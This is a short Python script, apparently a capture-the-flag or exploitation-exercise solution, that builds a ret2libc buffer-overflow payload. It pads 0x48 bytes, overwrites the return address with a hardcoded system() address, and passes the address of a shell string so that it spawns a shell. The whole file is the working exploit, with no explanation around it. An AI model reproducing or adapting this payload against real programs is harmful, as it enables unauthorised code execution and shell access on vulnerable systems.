#!/usr/bin/env python

import struct

def p32(num):
	return struct.pack("<I", num)

offset = 0x48
system_address = 0xf7e03020
sh_address = 0x80485ed

payload = offset * "A"  + p32(system_address) + 4 * "B" + p32(sh_address)
print(payload)
